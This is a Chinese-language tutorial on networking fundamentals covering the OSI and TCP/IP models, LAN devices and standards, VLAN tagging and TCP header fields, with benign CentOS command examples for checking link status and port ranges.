---
title: "网络基础知识"
date: 2023-08-01T13:46:56+08:00
draft: false
description: "梳理计算机网络的分层模型、OSI 参考模型与数据通信的基本过程。"
cover: "https://b3logfile.com/bing/20210821.jpg?imageView2/1/w/960/h/540/interlace/1/q/100"
categories: ["网络知识"]
tags: ["待分类"]
toc: true
---
# 一、网络基础

## 1.1 网络概念

计算机网络是一组计算机或网络设备通过有形的线缆或无形的媒介如无线，连接起来，按照一定的规则，进行通信的集合。

网络功能和优点

* 数据和应用程序
* 资源
* 网络存储
* 备份设备

作用范围分类：

* 广域网（WAN,Wide Area Network）
* 城域网（MAN,Metropolitan Area Network）
* 局域网（LAN,Local Area Network）

## 1.2 网络标准

### 1.网络标准和分层

旧模型：专有产品，有一个厂商控制应用程序和嵌入的软件

基于标准的模型：多厂商软件，分层方法

**层次划分的必要性**

计算机网络是由许多硬件、软件和协议交织起来的复杂系统。由于网络设计十分复杂，如何设计、组织和实现计算机网络是一个挑战，必须要采用科学有效的方法

**层次划分的方法**

* 网络的第一层应当具有相对独立的功能
* 梳理功能之间的关系，使一个功能可以为实现另一个功能提供必要的服务，从而形成系统的层次结构
* 为提高系统的工作效率，相同或相近的功能仅在一个层次中实现，而尽可能在较高的层次中实现
* 每一层只为相邻的上一层提高服务

**层次划分的优点**

* 各层之间相互独立，每一层只实现一种相对独立的功能，使问题复杂程度降低
* 灵活性好，各层内部的操作不会影响其他层
* 结构上可分割开，各层之间都可以采用最合适的技术来实现
* 易于实现和维护，因为整个系统已被分解成相对独立的子系统
* 能促进标准话工作，因为每一层的功能及其提供的服务都有了精确的说明

### 2.开放系统互联OSI

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-e60881c3.png)

在制定计算机网络标准方面，起着重大作用的俩大国际组织是：国际电信联盟电信标准化部门，与国际标准组织（ISO），虽然它们工作领域不同，但随着科学技术的发展，通信与信息处理之间的界限开始变得比较模糊，这也成了国际电信联盟电信标准化部门和ISO共同关心的领域。1984年，ISO发布了著名的OSI（Open System Interconnection）标准，它定义了网络互联的七层框架，物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。即OSI开放系统互联参考模型。

**OSI模型七层结构**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-0faf5836.png)
第7层 应用层

应用层（Application Layer）提供为应用软件而设的接口，以设置与另一应用软件之间的通信。例如:

HTTP、HTTPS、FTP、TELNET、SSH、SMTP、POP3、MySQL等

第6层 表示层

主条目：表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式

第5层 会话层

会话层（Session Layer）负责在数据传输中设置和维护电脑网络中两台电脑之间的通信连接。

第4层 传输层

传输层（Transport     Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。

第3层 网络层

网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成报文。网络表头包含了网络数据。例如:互联网协议（IP）等。

第2层 数据链接层

数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成信息框（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层

第1层 物理层

物理层（Physical Layer）在局部局域网上传送数据帧（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等

### 3.网络的通信过程

#### 数据封装和数据解封

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-357c7b45.png)

#### 协议数据单元PDU

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-9fb7829b.png)
PDU：Protocol Data Unit，协议数据单元是指对等层次之间传递的数据单位

* 物理层的PDU是数据位bit
* 数据链路层的PDU是数据帧frame
* 网络层的PDU是数据包packet
* 传输层的PDU是数据段segment
* 其他更高层次的PDU是消息message

#### 其他三种通讯模式

unicast：单播，目标设备是一个

broadcast：广播，目标设备是所有

multicast：多播，组播，目标设备是多个

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-a5b4de7c.png)

#### 冲突域和广播域

冲突域：俩个网络设备同时发送数据，如果发生了冲突则俩个设备处于同一个冲突域，反之则各自处于不同的冲突域

广播域：一个网络设备发送广播，另一个设备收到了，则俩个设备处于同一个广播域，反之则各自处于不同的广播域

#### 三种通讯机制

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-86d8f485.png)
单工通信：只有一个方向的通信，比如：收音机

半双工通信：通信双方都可以发送和接受信息，但不能同时发送，也不能同时接收，比如：对讲机

全双工通信：通信双方可以同时发送和接收，比如：手机

范例：查看双工和速度，也可以判断网线是否断了

```bash
[20:28:50 root@centos8 ~]#mii-tool -v ens33
ens33: negotiated 1000baseT-FD flow-control, link ok
product info: Yukon 88E1011 rev 3
basic mode:   autonegotiation enabled
basic status: autonegotiation complete, link ok
capabilities: 1000baseT-FD 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD
advertising:  1000baseT-FD 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD
link partner: 1000baseT-HD 1000baseT-FD 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD
[20:29:11 root@centos8 ~]#ethtool -i ens33
driver: e1000
version: 7.3.21-k8-NAPI
firmware-version:
expansion-rom-version:
bus-info: 0000:02:01.0
supports-statistics: yes
supports-test: yes
supports-eeprom-access: yes
supports-register-dump: yes
supports-priv-flags: no
[20:30:03 root@centos8 ~]#ethtool ens33
Settings for ens33:
Supported ports: [ TP ]
Supported link modes:   10baseT/Half 10baseT/Full
100baseT/Half 100baseT/Full
1000baseT/Full
Supported pause frame use: No
Supports auto-negotiation: Yes
Supported FEC modes: Not reported
Advertised link modes:  10baseT/Half 10baseT/Full
100baseT/Half 100baseT/Full
1000baseT/Full
Advertised pause frame use: No
Advertised auto-negotiation: Yes
Advertised FEC modes: Not reported
Speed: 1000Mb/s
Duplex: Full
Port: Twisted Pair
PHYAD: 0
Transceiver: internal
Auto-negotiation: on
MDI-X: off (auto)
Supports Wake-on: d
Wake-on: d
Current message level: 0x00000007 (7)
drv probe link
Link detected: yes         表示网线连接状态，可以判断网线是否断了
```

# 二、局域网Local Area Network

## 2.1 概述

**特点**

* 网络为一个单位所拥有
* 地理范围和站点数目均有限

**主要功能**

* 资源共享和数据通信

优点

* 能方便的共享昂贵的外部设备、主机以及软件、数据。从一个站点可以访问全网
* 便于系统的扩展和逐渐演变，各设备的位置可灵活的调整和改变
* 提高系统的可靠性、可用性和易用性

**标准**

IEEE于（国际电子电气工程师协会）1980年2月成立了局域网标准委员会（简称IEEE802委员会），专门从事局域网标准化工作，并制定了IEEE802标准。802标准所描述的局域网参考模型只对应OSI参考模型的数据链路层与物理层，它将数据链路层划分为逻辑链路层LLC子层和介质访问控制MAC子层

LLC子层负责向其上层提供服务

MAC子层的主要功能包括数据帧的封装/卸装，帧的寻址和识别，帧的接收与发送，链路的管理，帧的差错控制等。MAC子层的存在屏蔽了不同物理链路种类的差异性。
**局域网标准**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-2ed89a8f.png)

（1）    IEEE 802.1标准

局域网体系结构、网络互连、以及网络管理和性能测试

（2）    IEEE 802.2标准

逻辑链路控制LLC子层功能与服务

**（3）    IEEE 802.3标准（类似以太网）**

带冲突检测的载波侦听多路访问CSMA/CD总线介质访问控制子层与物理层规范

（4）    IEEE 802.4标准

令牌总线（Token Bus）介质访问控制子层与物理层规范

（5）    IEEE 802.5标准

令牌环（Token Ring）介质访问控制子层与物理层规范

（6）    IEEE 802.6标准

城域网MAN介质访问控制子层与物理层规范

（7）    IEEE 802.7标准

宽带网络技术

（8）    IEEE 802.8标准

光纤传输技术

（9）    IEEE 802.9标准

综合语音与数据局域网（IVD LAN）技术

（10）    IEEE 802.10标准

可互操作的局域网安全性规范（SILS）

**（11）    IEEE 802.11标准**

无线局域网技术

（12）    IEEE 802.12标准

优先度要求的访问控制方法

（13）    IEEE 802.13标准

未使用

（14）    IEEE 802.14标准

交互式电视网

（15）    IEEE 802.15标准

无线个人局域网（WPAN）的MAC子层和物理层规范。代表技术为蓝牙（Bluetooth）

（16）    IEEE 802.16标准

宽带无线局域网网络

（17）    IEEE802.20标准

移动宽带无线接入系统(MBWA，Mobile Broadband Wireless Access)

（18）    IEEE 802.22标准

无线地域网络（Wireless Regional Area Networks，WRAN）

**无线网络标准**

中国国家无线网络标准：WAPI

Wi-Fi：无线保真（Wireless Fidelity），是Wi-Fi联盟制造商的商标做为产品的品牌认证，是一个创建于IEEE 802.11标准的无线局域网技术，Wi-Fi联盟成立于1999年，当时的名称叫做Wireless Rthernet Compatibility Alliance（WECA）。在2002年10月，正式改名为Wi-Fi Alliance
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-50293d3c.png)

Wi-Fi 6是当前最新的WiFi技术标准，专业称呼为：802.11ax，WiFi6简单来讲就是第六代WiFi标准的意思，就和第五代移动通信标准——5G、丐帮第六代长老的意思差不多。在WiFi6之前，WiFi的名字并不是什么WiFi5、WiFi4这种简单的叫法，而是用一串非常拗口的技术型号来区分，比如WiFi5之前就叫802.11 ac，WiFi4就叫802.11  a/b/g/n，对于懂行的人来说辨别起来没问题，但对于普通用户来说就是两眼一抓瞎看谁都一样（这就好比俄罗斯大兄弟的人名：尼古拉·阿列克谢耶维奇·奥斯特洛夫斯基，一 样难记）

## 2.2 组网设备

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-ee960d23.png)

### 1.网络线缆和接口

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-f117f44d.png)

#### 网线标准

上世纪80年代初，诞生了最早的网线标准（CAT）,这个标准一直沿用至今，主要根据带宽和传输速率来区分，从一类网线CAT1——八类网线CAT8

1. 一类网线：主要用于传输语音，不同于数据传输主要用于八十年代初之前的电话线缆，已淘汰。
2. 二类网线：传输带宽为1MHZ，用于语音传输，最高数据传输速率4Mbps，常见于使用4Mbps规范令牌传递协议的旧的令牌网（Token Ring），已被淘汰
3. 三类网线：该电缆的传输带宽16MHz，用于语音传输及最高传输速率为10Mbps的数据传输，主要用于10BASE--T，被ANSI/TIA-568.C.2作为最低使用等级 。
4. 四类网线：该类电缆的传输频率为20MHz，用于语音传输和最高传输速率16Mbps（指的是
   16Mbit/s令牌环）的数据传输，主要用于基于令牌的局域网和 10BASE-T/100BASE-T。最大网段长为100m，采用RJ形式的连接器，未被广泛采用。
5. 五类线：可追溯到1995年，传输带宽为100MHz，可支持10Mbps和100Mbps传输速率（虽然现实中与理论值有一定差距），主要用于双绞线以太网（10BASE-T/100BASE-T），目前仍可使用，不过在    新网络建设中已经很难看到。
6. 超五类线：标准于2001年被提出，传输带宽为100MHz，近距离情况下传输速率已可达
   1000Mbps。它具有衰减小，串扰少，比五类线增加了近端串音功率和测试要求，所以它也成为了当前应用最为广泛的网线
7. 六类线：继CAT5e之后，CAT6标准被提出，传输带宽为250MHz，最适用于传输速率为1Gbps的应用。改善了在串扰以及回波损耗方面的性能，这一点对于新一代全双工的高速网络应用而言是极重要    的，还有一个特点是在4个双绞线中间加了十字形的骨架。
8. 超六类线：超六类线是六类线的改进版，发布于2008年，同样是ANSI/TIA-568C.2和ISO/IEC 11801 超六类/EA级标准中规定的一种双绞线电缆，主要应用于万兆位网络中。传输频率500 MHz，最大传输速度也可达到10Gbps ，在外部串扰等方面有较大改善。
9. 七类线：该线是ISO/IEC 11801 7类/F级标准中于2002年认可的一种双绞线，它主要为了适应万兆以太网技术的应用和发展。但它不再是一种非屏蔽双绞线了，而是一种屏蔽双绞线，所以它的传输频率  至少可达600 MHz，传输速率可达10 Gbps。
10. 超七类线:相对于CAT7最大区别在于，支持的频率带宽提升到了1000MHz，在国内而言，七类网线已经有很少地方使用了，超七类就更加没有广泛的进入人们的生活，目前使用范围最广的是超五类、  六类等网线
11. 八类线CAT8：相关标准由美国通信工业协会 （TIA）TR-43委员会在2016年正式发布，支持
    2000MHz带宽，支持40Gbps以太网络，主要应用于数据中心

#### 网线线序和规范

**非屏蔽式双绞线Unshielded Twisted-Pair Cable UTP**

**T568B和T568A**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-f4676b9c.png)

**RJ-45 Connector和Jack**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-20d818c2.png)

**UTP直通线（Straight-Through）**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-91b70321.png)

**UTP交叉线（Crossover）**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-94d5aa01.png)
**UTP直通线和交叉线**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-37a0fe36.png)

**双绞线阵脚定义**
注：BI=双向数据 RX=接收数据 Receive Data TX=传送数据 Transmit Data
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-87b35ff7.png)

#### 光纤和接口Fiber-Optic

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-0a88b624.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-146974b5.png)

* Short wavelength（1000BASE-SX）最远几百米
* Long wavelength/long haul (1000BASE-LX/LH)最远几公里
* Extended distance （1000BASE-ZX）最远上百公里

### 2.网络适配器

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-7e0a7697.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-2eedce93.png)

**作用**

* 进行串行/并行转换
* 数据缓存
* 在计算机操作系统中安装设备驱动程序
* 实现以太网协议

**类型**

* 按总线接口类型进行分类
  
  * 分为ISA、PCI、PCI-X、PCMCIA、PCI-E和USB等几种类型
* 按传输介质接口分类
* 细同轴电缆的BNC接口网卡、粗同轴电缆AUI接口网卡、以太网双绞线RJ-45接口网卡、光纤F/O接口网卡、无线网卡等
* 按传输速率（带宽）分类
* 10Mbps网卡、100Mbps以太网卡、10Mbps/100Mbps自适应网卡、1000Mbps千兆以太网卡、40Gbps自适应网卡等

### 3.中继器和集线器

#### 中继器repeater

实际上是一种信号再生放大器，可将变弱的信号和有失真的信号进行整形与放大，输出信号比原信号的强度将大大提高，中继器不解释、不改变收到的数字信息，而只是将其整形放大后在转发出去

**优点**

* 易于操作
* 很短的等待时间
* 价格便宜
* 突破线缆的距离限制来扩展局域网段的距离
* 可用来连接不同的物理介质

**缺点**

* 采用中继器连接网络分支的数目要受具体的网络体系结构限制
* 中继器不能连接不同类型的网络
* 中继器没有隔离和过滤功能，无路由选择、交换、纠错/检错功能，一个分支出现故障可能会影响到其他的每一个网络分支
* 使用中继器扩充网络距离是最简单最廉价的方法，但当负载增加时，网络性能急剧下降，所以只有当网络负载很轻和网络时延要求不高的条件下才能使用

#### 集线器Hub

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-28659377.png)

集线器（Hub）工作在物理层，是中继器的一种形式，是一种集中连接缆线的网络组件，可以认为集线 器是一个多端口的中继器，集线器能够提供多端口服务，主要功能是对接收到的信号进行再生整形放     大，以扩大网络的传输距离，同时把所有节点集中在以它为中心的节点上

Hub并不记忆报文是由哪个MAC地址发出，哪个MAC地址在Hub的哪个端口Hub的特点：

* 共享带宽
* 半双工

### 4.网桥和交换机

#### 网桥

网桥（Bridge）也叫桥接器，是连接两个局域网的一种存储/转发设备，根据MAC地址表对数据帧进行转发，可隔离碰撞域

网桥将网络的多个网段在数据链路层连接起来，并对网络数据帧进行管理

网桥的内部结构
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-0b080e5d.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-ddb73cf4.png)

**优点**

* 过滤通信量
* 扩大了物理范围
* 提高了可靠性
* 可互连不同物理层、不同 MAC 子层和不同速率（如10 Mb/s 和 100 Mb/s 以太网）的局域网

**缺点**

* 存储转发增加了时延
* 在MAC 子层并没有流量控制功能
* 具有不同 MAC 子层的网段桥接在一起时时延更大
* 网桥只适合于用户数不太多(不超过几百个)和通信量不太大的局域网，否则有时还会因传播过多的 广播信息而产生网络拥塞。这就是所谓的广播风暴

#### 交换机switch

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-f207f2bc.png)

交换机是工作在OSI参考模型数据链路层的设备，外表和集线器相似

它通过判断数据帧的目的MAC地址，从而将数据帧从合适端口发送出去交换机是通过MAC地址的学习和维护更新机制来实现数据帧的转发

**内部结构**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-27081b08.png)

工作原理

* 交换机根据收到数据帧中的源MAC地址建立该地址同交换机端口的映射，并将其写入MAC地址表中
* 交换机将数据帧中的目的MAC地址同已建立的MAC地址表进行比较，以决定由哪个端口进行转发
* 如数据帧中的目的MAC地址不在MAC地址表中，则向所有端口转发。这一过程称为泛洪（flood）
* 广播帧和组播帧向所有的端口转发

**集线器与交换机的比较**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-89baa0cd.png)

* 交换机属于数据链路层设备，而集线器属于物理层设备集线器在转发帧时，不对传输介质进行检测，交换机在转发帧之前必须执行 CSMA/CD 算法。若在发送过程中出现碰撞，就必须停止发送和进行退避。所以交换机能隔离冲突，而集线器却只能增加冲  突
* 交换机的每个端口可提供专用的带宽，而集线器的所有端口只能共享带宽
* 集线器只能实现半双工传送，而交换机可支持全双工传送
* 集线器和交换机都无法隔离广播域

### 5.路由器router

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-ef8e90e8.png)

路由：把一个数据包从一个设备发送到不同网络里的另一个设备上去。这些工作依靠路由器来完成。路  由器只关心网络的状态和决定网络中的最佳路径。路由的实现依靠路由器中的路由表来完成

路由器功能：

* 工作在网络层
* 分隔广播域和冲突域
* 选择路由表中到达目标最好的路径维护和检查路由信息
* 连接广域网

## 2.3 以太网技术

### 1.概述

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-2c588061.png)

以太网（Ethernet）是一种产生较早且使用相当广泛的局域网，由美国Xerox（施乐）公司的Palo Alto

研究中心（简称为PARC）于20世纪70年代初期开始研究并于1975年研制成功

### 2.以太网MAC帧格式

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-c349303e.png)

### 3.MAC地址

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-24ccac4c.png)
在局域网中，硬件地址又称为物理地址或MAC地址（因为这种地址用在MAC帧中）

IEEE     802标准为局域网规定了一种48位的全球地址（一般都简称为“地址”)，是局域网中每一台计算机固化在网卡ROM中的地址

IEEE 的注册管理机构 RA 负责向厂家分配地址字段的前三个字节(即高位 24 位)

地址字段中的后三个字节(即低位 24 位)由厂家自行指派，称为扩展标识符，必须保证生产出的适配器没有重复地址

### 4.冲突检测的载波侦听多路访问CSMA/CD

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-2700575e.png)
**工作原理**

* 先听后发
* 边发边听
* 冲突停止
* 延迟重发

## 2.4 虚拟局域网VLAN

### 1.VLAN原理

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-3b0d7def.png)

虚拟局域网 VLAN 是由一些局域网网段构成的与物理位置无关的逻辑组

这些网段具有某些共同的需求。每一个 VLAN 的帧都有一个明确的标识符，指明发送这个帧的工作站是属于哪一个 VLAN。虚拟局域网其实只是局域网给用户提供的一种服务，而并不是一种新型局域网

**优点**

* 更有效地共享网络资源。如果用交换机构成较大的局域网，大量的广播报文就会使网络性能下 降。VLAN能将广播报文限制在本VLAN范围内，从而提升了网络的效能
* 简化网络管理。当结点物理位置发生变化时，如跨越多个局域网，通过逻辑上配置VLAN即可形成网络设备的逻辑组，无需重新布线和改变IP地址等。这些逻辑组可以跨越一个或多个二层交换机
* 提高网络的数据安全性。一个VLAN中的结点接收不到另一个VLAN中其他结点的帧

**虚拟局域网的实现技术**

* 基于端口的VLAN
* 基于MAC地址的VLAN
* 基于协议的VLAN
* 基于网络地址的VLAN

### 2.IEEE 802.1Q帧结构

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-47fdcafe.png)

**IEEE 802.1Q帧结构**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-c7f079dc.png)
**VLAN 标签各字段含义**

**TPID**：Tag Protocol Identifier（标签协议标识符），2Byte，表示帧类型，取值为0x8100时表示IEEE 802.1Q的VLAN数据帧。如果不支持802.1Q的设备收到这样的帧，会将其丢弃，各设备厂商可以自定义      该字段的值。当邻居设备将TPID值配置为非0x8100时， 为了能够识别这样的报文，实现互通，必须在本设备上修改TPID值，确保和邻居设备的TPID值配置一致

**PRI**：Priority，3bit，表示数据帧的802.1p（是IEEE 802.1Q的扩展协议）优先级。取值范围为0～7， 值越大优先级越高。当网络阻塞时，交换机优先发送优先级高的数据帧

**CFI**：Canonical Format Indicator（标准格式指示位），1bit,表示MAC地址在不同的传输介质中是否以标准格式进行封装，用于兼容以太网和令牌环网。CFI取值为0表示MAC地址以标准格式进行封装，为1 表示以非标准格式封装。在以太网中，CFI的值为0

**VID**：VLAN ID，12bit，表示该数据帧所属VLAN的编号。VLAN ID取值范围是0～4095。由于0和4095为协议保留取值，所以VLAN ID的有效取值范围是1～4094

## 2.5 分层的网络架构

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-6f2079fd.png)

**架构**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-310dda8b.png)

# 三、TCP/IP协议栈

## 3.1 TCP/IP标准

### 1.TCP/IP介绍

Transmission Control Protocol/Internet Protocol 传输控制协议/因特网互联协议

TCP/IP是一个Protocol Stack，包扣TCP、IP、UDP、ICMP、RIP、TELNET、FTP、SMTP、ARP等许多协议

最早发源于1969年美国国防部（缩写为DoD）的因特网的前身ARPA网项目，1983年1月1日，TCP/IP取代了旧的网络控制协议NCP，成为今天的互联网和局域网的基石和标准，由互联网工程任务组负责维护

国防部高级研究计划局DARPA与BBN技术公司、斯坦福大学和伦敦大学学院签约，在多个硬件平台上开发协议的操作版本。在协议开发过程中，数据包路由层的版本号从版本1进展到版本4，后者于1983年安装在ARPANET中。它被称为互联网协议版本4（IPv4）作为协议，仍在互联网使用，连同其目前的继承，互联网协议版本6（IPv6）。

RFC文档：[https://www.ietf.org/rfc/rfc1180.html](https://www.ietf.org/rfc/rfc1180.html)

### 2.TCP/IP分层

共定义了四层，和OSI参考模型的分层有对应关系

RFC文档：[https://www.ietf.org/rfc/rfc1122#section-1.3.3](https://www.ietf.org/rfc/rfc1122#section-1.3.3)

RFC官方分为四层：

* Application Layer
* Transport Layer
* Internet Layer
* Link Layer（media-access）

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-471d1fc0.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-d0fe7a5e.png)

**TCP/IP 应用层**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-35704b3c.png)

### 3.TCP/IP通信过程

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-a827e3a5.png)

### 4.TCP/IP和OSI模型的比较

* 相同点
  * 俩者都是以协议栈的概念为基础
  * 协议栈中的协议彼此相互独立
  * 下层对上层提供服务
* 不同点
  * OSI是先有模型；TCP/IP是先有协议，后有 模型
  * OSI是国际标准，适用于各种协议栈；TCP/IP实际标准，只适用于TCP/IP网络
  * 层次数量不同

## 3.2 transport 层

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-7598db2b.png)

**TCP和UDP**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-01447877.png)

### 1.TCP Transmission Control Protocol

#### TCP特性

工作在传输层

面向连接协议

全双工协议

半关闭

错误检查

将数据包打包成段，排序

确认机制

数据恢复，重传

流量控制，滑动窗口

拥塞控制，慢启动和拥塞避免算法

**更多关于tcp的内核参数，可参看man 7 tcp**

#### TCP包头结构

**TCP包头**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-a8746dc7.png)

* 源端口、目标端口：计算机上的进程要和其他进程通信是要通过计算机端口的，而一个计算机端口某个时刻只能被一个进程占用，所以通过指定端口和目标端口，就可以知道是那俩个进程需要通信。源端口、目标端口是用16位表示的，可推算计算机的端口个数为2^16个，即65536
* 序列号：表示本报文段所发送数据的第一个字节的编号。在TCP连接中所传送的字节流的每一个字节都会按顺序编号。由于序列号由32位表示，所以每2^32个字节，就会出现序列号回绕，再次从0开始
* 确认号：表示接收方期望收到发送方下一个报文段的第一个字节数据的编号。也就是告诉发送方：我希望你（指发送方）下次发送的数据第一个字节数据的编号位此确认号
* 数据偏移：表示TCP报文段的首部长度，共4位，由于TCP首部包含一个长度可变的选项部分，需要指定这个TCP报文段到底有多长。它指出TCP报文段的数据起始处距离TCP报文段的起始处有多远。该字段的单位是32位（即4个字节为计算单位），4位二进制最大表示15，所以数据偏移也就是TCP首部最大60字节
* URG：表示本报文段中发送的数据是否包含紧急数据。后面的紧急指针字段（urgent pointer）只有当URG=1时才有效
* **ACK：表示是否前面确认号字段是否有效。只有当ACK=1时，前面的确认号字段才有效。TCP规定，连接建立后，ACK必须为1，带ACK标志的TCP报文段称为确认报文段**
* PSH：提示接收端应用程序应该立即从TCP接收缓冲区中读走数据，为接收后续数据腾出空间。如果为1，则表示对方应当立即把数据提交给上层应用，而不是缓存起来，如果应用程序不将接收到的数据读走，就会一直停留在TCP接收缓冲区中
* RST：如果收到一个RST=1的报文，说明与主机的连接出现了严重错误（如主机崩溃），必须释放连接，然后在重新建立连接。或者说明上次发送给主机的数据有问题，主机拒绝响应，带RST标志的TCP报文段称为复位报文段。
* **SYN：在建立连接时使用，用来同步序列号。当SYN=1，ACK=0时，表示这是一个请求建立连接的报文段；当SYN=1，ACK=1时，表示对方同意建立连接。SYN=1，说明这是一个请求建立连接或同意建立连接的报文。只有在前俩次握手中SYN才置为1，带SYN标志的TCP报文段称为同步报文段**
* FIN：表示通知对方本端要关闭连接了，标记数据是否发送完毕。如果FIN=1，即告诉对方：“我的数据已经发送完毕，你可以释放连接了”带FIN标志的TCP报文段称为结束报文段
* 窗口大小：表示现在允许对方发送的数据量，也就是告诉对方，从本报文段的确认号开始允许对方发送的数据量，达到此值，需要ACK确认后才能再继续传送后面数据，由Window size value * Window size scaling factor（此值在三次握手阶段TCP选项Window scale协商得到）得出此值
* 校验和：提供额外得可靠性
* 紧急指针：标记紧急数据在数据字段中得位置
* 选项部分：其最大长度可根据TCP首部长度进行推算。TCP首部长度用4为表示，选项部最长为：(2^4-1)*4-20=40字节

**TCP包头常见选项：**

* 最大报文长度MSS（Maximum Segment Size）通常1460字节
  
  * 指明自己期望对方发送TCP报文段时那个数据字段的长度。比如：1460字节。数据字段的长度加上TCP首部的长度才等于整个TCP报文段的长度。MSS不宜设的太大也不宜设的太小。若选择太小，极端情况下，TCP报文段只含有1字节数据，在IP层传输的数据报的开销至少有40字节（包括TCP报文段的首部和IP数据报的首部）。这样，网络的利用率就不会超过1/41。若TCP报文段非常长，那么在IP层传输时就有可能要分解成多个短数据报片。在终点要把收到的各个短数据报片装配 成原来的TCP报文段。当传输出错时还要进行重传，这些也都会使开销增大。因此MSS应尽可能 大，只要在IP层传输时不需要再分片就行。在连接建立过程中，双方都把自己能够支持的MSS写入这一字段。 MSS只出现在SYN报文中。即：MSS出现在SYN=1的报文段中
  * MTU和MSS值的关系：MTU=MSS+IP Header+TCP Header
  * 通信双方最终的MSS值=较小MTU-IP Header-TCP Header
* 窗口扩大 Window Scale
  
  * 为了扩大窗口，由于TCP首部的窗口大小字段长度是16位，所以其表示的最大数是65535。但是随着时延和带宽比较大的通信产生（如卫星通信），需要更大的窗口来满足性能和吞吐率，所以产生  了这个窗口扩大选项
* 时间戳 Timestamp
  
  * 可以用来计算RTT(往返时间)，发送方发送TCP报文时，把当前的时间值放入时间戳字段，接收方收到后发送确认报文时，把这个时间戳字段的值复制到确认报文中，当发送方收到确认报文后即可  计算出RTT。也可以用来防止回绕序号PAWS，也可以说可以用来区分相同序列号的不同报文。因为序列号用32为表示，每2^32个序列号就会产生回绕，那么使用时间戳字段就很容易区分相同序列号的不同报文

#### TCP协议PORT

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-e6c46a24.png)

**传输层通过port号，确定应用层协议，范围0-65535**

维基百科：[https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)

IANA互联网数字分配机构负责域名，数字资源，协议分配

* 0-1023：系统端口或特权端口（仅管理员可用），众所周知，永久的分配给固定的系统应用使用，22/tcp(ssh),80/tcp(http),443/tcp(https)
* 1024-49151:用户端口或注册端口，但要求并不严格，分配给程序注册为某应用使用,1433/tcp(SqlServer),1521/tcp(oracle),3306/tcp(mysql),11211/tcp/udp(memcacjed)
* 49152-65535：动态或私有端口，客户端随机使用端口，范围定义：/proc/sys/net/ipv4/ip_local_prot_range

**范例：查看linux系统中端口是否被定义使用**

```bash
[17:21:22 root@centos8 ~]#cat /etc/services
```

**范例：调整客户端的动态端口发范围**

```bash
[09:08:23 root@centos8 ~]#cat /proc/sys/net/ipv4/ip_local_port_range
32768	60999
[10:46:45 root@centos8 ~]#echo 20000 62000 > /proc/sys/net/ipv4/ip_local_port_range
[10:47:04 root@centos8 ~]#cat /proc/sys/net/ipv4/ip_local_port_range
20000	62000
```

**范例：**

```bash
[10:47:05 root@centos8 ~]#dnf -y install man-pages
[10:47:47 root@centos8 ~]#man 2 socket
[10:48:56 root@centos8 ~]#dnf -y install nc

#服务器端
[10:49:27 root@centos8 ~]#ss -ntlu
Netid         State          Recv-Q         Send-Q                   Local Address:Port                   Peer Address:Port
udp           UNCONN         0              0                              0.0.0.0:111                         0.0.0.0:*
udp           UNCONN         0              0                                 [::]:111                            [::]:*
tcp           LISTEN         0              128                            0.0.0.0:111                         0.0.0.0:*
tcp           LISTEN         0              128                            0.0.0.0:22                          0.0.0.0:*
